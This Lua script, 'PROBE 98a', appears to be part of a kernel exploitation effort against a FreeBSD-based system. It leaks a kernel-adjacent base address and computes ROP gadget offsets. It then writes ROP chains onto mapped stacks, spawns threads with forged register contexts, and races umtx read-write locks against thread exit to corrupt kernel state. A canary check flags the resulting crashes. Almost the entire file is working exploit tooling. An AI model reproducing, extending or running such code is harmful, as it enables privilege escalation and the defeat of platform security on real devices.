-- CRASH_CLASS: HIGH
-- PROBE 98a: RW-lock race — op 13 (WRLOCK) allocates kernel objects (vmd=6)
--
-- FreeBSD urwlock: rw_state at +0x00, rw_flags at +0x04
-- WRLOCK=13, RDLOCK=12, RW_UNLOCK=14
-- Key question: does umtx_thread_cleanup handle RW locks?
-- If NOT, exiting with WRLOCK held orphans the lock AND
-- leaves stale umtx_q entries that other threads reference.
--
-- A) Gate: basic RW ops + VM delta measurement
-- B) Exit-with-WRLOCK: does kernel clean up? Do waiters wake?
-- C) WRLOCK/UNLOCK spin race with exit + rw_state clear
-- D) RDLOCK readers vs WRLOCK exit race

print("=== PROBE 98a: RW-LOCK RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function hex(v)
    if v<0 then v=v+0x100000000 end
    return string.format("0x%X",v)
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local MAX_CH=50
local STK_PG=2
local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)

local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local ts1ms=R+0x20; wq(ts1ms,uint64(0)); wq(ts1ms+8,uint64(1000000))
local ts5ms=R+0x40; wq(ts5ms,uint64(0)); wq(ts5ms+8,uint64(5000000))
local ts50ms=R+0x60; wq(ts50ms,uint64(0)); wq(ts50ms+8,uint64(50000000))
local ts2ms=R+0x80; wq(ts2ms,uint64(0)); wq(ts2ms+8,uint64(2000000))
local ts200ms=R+0xA0; wq(ts200ms,uint64(0)); wq(ts200ms+8,uint64(200000000))
local tb=R+0xC0
local exit_flag=R+0xE0

-- RW lock struct: rw_state(4) + rw_flags(4) + blocked_readers(4) + blocked_writers(4) + spare(16)
local rwl=R+0x200
local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

local function set_ctx(ctx, rsp, rax, rdi, rsi, rdx, r10, r8)
    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,rsp)
    wq(ctx+_AX,uint64(rax))
    wq(ctx+_DI,uint64(rdi)); wq(ctx+_SI,uint64(rsi))
    wq(ctx+_DX,uint64(rdx)); wq(ctx+_R10,uint64(r10))
    wq(ctx+_R8,uint64(r8))
end

local function spawn(rax, rdi, rsi, rdx, r10, r8, rop_fn)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local off=0
    if rop_fn then off=rop_fn(stk) end
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8
    set_ctx(ctx, uint64(stk), rax, rdi, rsi, rdx, r10, r8)
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local function fresh_rwl()
    z(rwl, 0x20)  -- rw_state=0, rw_flags=0
    wq(exit_flag, uint64(0))
end

local function rwl_state()
    local s=rd(rwl) or 0
    if s<0 then s=s+0x100000000 end
    return s
end

local function check(label)
    local s=rwl_state()
    local c=N(native.fcall_with_rax(stub,20))
    local fl=rd(exit_flag) or 0
    print(string.format("%s: rw_state=%s flag=%d can=%d %s",
        label, hex(s), fl, c, c==pid and "OK" or "!!CANARY"))
    return c==pid
end

-- ============================================================
-- A: GATE — basic RW lock operations
-- ============================================================
print("--- A: RW LOCK GATE ---")
fresh_rwl()

-- WRLOCK from main
local v0=vmc()
local ok1,rv1=pcall(function()
    return sc_umtx(uint64(rwl),uint64(13),uint64(0),uint64(0),uint64(0))
end)
local v1=vmc()
local s1=rwl_state()
print(string.format("WRLOCK: rv=%s state=%s vmd=%d",
    ok1 and tostring(N(rv1)) or "FAIL", hex(s1), v1-v0))

-- UNLOCK
local ok2,rv2=pcall(function()
    return sc_umtx(uint64(rwl),uint64(14),uint64(0),uint64(0),uint64(0))
end)
local v2=vmc()
local s2=rwl_state()
print(string.format("UNLOCK: rv=%s state=%s vmd=%d",
    ok2 and tostring(N(rv2)) or "FAIL", hex(s2), v2-v1))

-- RDLOCK from main
local v3=vmc()
local ok3,rv3=pcall(function()
    return sc_umtx(uint64(rwl),uint64(12),uint64(0),uint64(0),uint64(0))
end)
local v4=vmc()
local s3=rwl_state()
print(string.format("RDLOCK: rv=%s state=%s vmd=%d",
    ok3 and tostring(N(rv3)) or "FAIL", hex(s3), v4-v3))

-- RDLOCK again (second reader)
local ok4,rv4=pcall(function()
    return sc_umtx(uint64(rwl),uint64(12),uint64(0),uint64(0),uint64(0))
end)
local s4=rwl_state()
print(string.format("RDLOCK2: rv=%s state=%s",
    ok4 and tostring(N(rv4)) or "FAIL", hex(s4)))

-- UNLOCK twice
pcall(function() sc_umtx(uint64(rwl),uint64(14),uint64(0),uint64(0),uint64(0)) end)
pcall(function() sc_umtx(uint64(rwl),uint64(14),uint64(0),uint64(0),uint64(0)) end)
local s5=rwl_state()
print(string.format("after 2x UNLOCK: state=%s", hex(s5)))

local wrlock_works=(ok1 and N(rv1)==0)
if not wrlock_works then
    print("WRLOCK NOT FUNCTIONAL — abort")
    return
end
print("gate OK")

-- VM delta consistency
print("")
print("VM delta (5 rounds):")
for i=1,5 do
    fresh_rwl()
    local a=vmc()
    pcall(function() sc_umtx(uint64(rwl),uint64(13),uint64(0),uint64(0),uint64(0)) end)
    local b=vmc()
    pcall(function() sc_umtx(uint64(rwl),uint64(14),uint64(0),uint64(0),uint64(0)) end)
    local c=vmc()
    print(string.format("  round %d: WRLOCK vmd=%d UNLOCK vmd=%d", i, b-a, c-b))
end

-- ============================================================
-- B: EXIT-WITH-WRLOCK — does kernel clean up?
-- ============================================================
print("")
print("--- B: EXIT-WITH-WRLOCK ---")
fresh_rwl()

-- Child A: WRLOCK → thr_exit (immediate, no sleep)
local tidA=spawn(454, rwl, 13, 0, 0, 0, function(stk)
    local off=0
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
    wq(stk+off,SA); off=off+8
    return off
end)
print(string.format("child A TID=%s", tidA and hex(N(tidA)) or "nil"))

native.fcall_with_rax(stub,240,ts50ms,0)

local s_after=rwl_state()
local fl=rd(exit_flag) or 0
print(string.format("after exit: rw_state=%s flag=%d", hex(s_after), fl))

-- Is the lock still held?
local still_held=(s_after~=0)
print("lock orphaned: "..tostring(still_held))

-- Try WRLOCK from main (non-blocking test via TRYLOCK behavior)
-- We don't have a TRY variant, so test with clear+WRLOCK
if still_held then
    print("clearing rw_state for recovery...")
    wd(rwl, 0)
end

local v_pre=vmc()
local ok_lk,rv_lk=pcall(function()
    return sc_umtx(uint64(rwl),uint64(13),uint64(0),uint64(0),uint64(0))
end)
local v_post=vmc()
local s_lk=rwl_state()
print(string.format("re-WRLOCK: rv=%s state=%s vmd=%d",
    ok_lk and tostring(N(rv_lk)) or "FAIL", hex(s_lk), v_post-v_pre))
-- Unlock
pcall(function() sc_umtx(uint64(rwl),uint64(14),uint64(0),uint64(0),uint64(0)) end)

if not check("B") then print("ABORT") return end

-- B2: Does a blocked waiter wake when holder exits?
print("")
print("--- B2: BLOCKED WAITER + EXIT ---")
fresh_rwl()

-- Child A: WRLOCK → sleep 100ms → thr_exit
spawn(454, rwl, 13, 0, 0, 0, function(stk)
    local off=0
    -- nanosleep(5ms)
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts5ms)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8
    -- thr_exit
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
    wq(stk+off,SA); off=off+8
    return off
end)

-- Child B: WRLOCK (will block on A's lock)
-- If woken, do UNLOCK → write marker to exit_flag+4
local marker=exit_flag+4; wd(marker, 0)
spawn(454, rwl, 13, 0, 0, 0, function(stk)
    local off=0
    -- After WRLOCK returns (if woken): UNLOCK
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(14)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
    wq(stk+off,SA); off=off+8
    return off
end)

native.fcall_with_rax(stub,240,ts50ms,0)

local s_b2=rwl_state()
local fl_b2=rd(exit_flag) or 0
print(string.format("B2: rw_state=%s exit_flag=%d", hex(s_b2), fl_b2))
print(string.format("waiter still blocked: %s", s_b2~=0 and "YES (no cleanup)" or "no (woken)"))

-- If waiter is blocked (state != 0), clear and wake
if s_b2~=0 then
    print("B2: kernel does NOT clean up RW locks on exit!")
    print("B2: clearing rw_state + NWAKE...")
    wd(rwl, 0)
    pcall(function()
        sc_umtx(uint64(rwl),uint64(21),uint64(1),uint64(0),uint64(0))
    end)
    native.fcall_with_rax(stub,240,ts50ms,0)
    local s_wake=rwl_state()
    print(string.format("B2 after wake: rw_state=%s", hex(s_wake)))
end

if not check("B2") then print("ABORT") return end

-- ============================================================
-- C: WRLOCK/UNLOCK SPIN RACE WITH EXIT
-- ============================================================
print("")
print("--- C: WRLOCK SPIN RACE ---")

local hits_c=0
for round=1,5 do
    if cidx>=MAX_CH-9 then print("C: LIMIT at ch="..cidx) break end

    fresh_rwl()
    local vm0=vmc()

    -- Child A: WRLOCK → 5ms → thr_exit
    spawn(454, rwl, 13, 0, 0, 0, function(stk)
        local off=0
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts5ms)); off=off+8
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
        wq(stk+off,SA); off=off+8
        return off
    end)

    -- 8 spinners: WRLOCK(13) → UNLOCK(14) loop
    -- They will block on first WRLOCK (A holds it)
    -- We clear rw_state and NWAKE to unblock them during A's exit
    for i=1,8 do
        spawn(454, rwl, 13, 0, 0, 0, function(stk)
            local off=0
            local cycles=math.floor((STK_PG*0x4000-200)/80)
            for j=1,cycles do
                wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(14)); off=off+8
                wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
                wq(stk+off,SA); off=off+8
                wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(13)); off=off+8
                wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
                wq(stk+off,SA); off=off+8
            end
            return off
        end)
    end

    -- Wait 3ms — spinners are blocked on WRLOCK, A is sleeping
    native.fcall_with_rax(stub,240,ts2ms,0)
    native.fcall_with_rax(stub,240,ts1ms,0)

    -- Clear rw_state + NWAKE to jolt blocked spinners
    -- This happens ~2ms before A's thr_exit
    wd(rwl, 0)
    pcall(function()
        sc_umtx(uint64(rwl),uint64(21),uint64(0x7FFFFFFF),uint64(0),uint64(0))
    end)

    -- Wait for A to exit and spinners to run
    native.fcall_with_rax(stub,240,ts50ms,0)

    local vm1=vmc()
    local s=rwl_state()
    local fl=rd(exit_flag) or 0
    local c=N(native.fcall_with_rax(stub,20))

    local tag=""
    if c~=pid then hits_c=hits_c+1; tag=" !!CANARY" end

    print(string.format("C%d: state=%s flag=%d vmd=%d can=%d%s",
        round, hex(s), fl, vm1-vm0, c, tag))

    -- Clean up orphaned lock for next round
    if s~=0 then
        wd(rwl, 0)
        pcall(function()
            sc_umtx(uint64(rwl),uint64(21),uint64(0x7FFFFFFF),uint64(0),uint64(0))
        end)
        native.fcall_with_rax(stub,240,ts5ms,0)
    end
end
print("C hits="..hits_c)

-- ============================================================
-- D: RAPID WRLOCK+EXIT CYCLING
-- ============================================================
print("")
print("--- D: RAPID WRLOCK+EXIT ---")

if cidx<MAX_CH-12 then
    fresh_rwl()

    -- 4 spinners first (WRLOCK/UNLOCK loop, will block initially)
    for i=1,4 do
        spawn(454, rwl, 13, 0, 0, 0, function(stk)
            local off=0
            local cycles=math.floor((STK_PG*0x4000-200)/80)
            for j=1,cycles do
                wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(14)); off=off+8
                wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
                wq(stk+off,SA); off=off+8
                wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(13)); off=off+8
                wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
                wq(stk+off,SA); off=off+8
            end
            return off
        end)
    end

    local vm0=vmc()
    local ok_count=0

    -- Rapidly spawn WRLOCK+exit children, clearing + waking between each
    for i=1,8 do
        if cidx>=MAX_CH then break end
        wd(rwl, 0)  -- clear for next locker
        wq(exit_flag, uint64(0))
        -- NWAKE to unblock any stuck spinners
        pcall(function()
            sc_umtx(uint64(rwl),uint64(21),uint64(0x7FFFFFFF),uint64(0),uint64(0))
        end)

        spawn(454, rwl, 13, 0, 0, 0, function(stk)
            local off=0
            wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
            wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
            wq(stk+off,SA); off=off+8
            return off
        end)

        native.fcall_with_rax(stub,240,ts1ms,0)
        local c=N(native.fcall_with_rax(stub,20))
        if c==pid then ok_count=ok_count+1 end
        if c~=pid then
            print(string.format("D: CRASH at i=%d!", i))
            break
        end
    end

    native.fcall_with_rax(stub,240,ts50ms,0)
    local vm1=vmc()
    local s=rwl_state()
    local c=N(native.fcall_with_rax(stub,20))
    print(string.format("D: %d/8 ok state=%s vmd=%d can=%d %s",
        ok_count, hex(s), vm1-vm0, c, c==pid and "OK" or "!!CANARY"))
else
    print("D: SKIP (child limit)")
end

-- ============================================================
print("")
print(string.format("SUMMARY: C=%d ch=%d", hits_c, cidx))
print("final canary="..N(native.fcall_with_rax(stub,20)))
print("=== 98a COMPLETE ===")
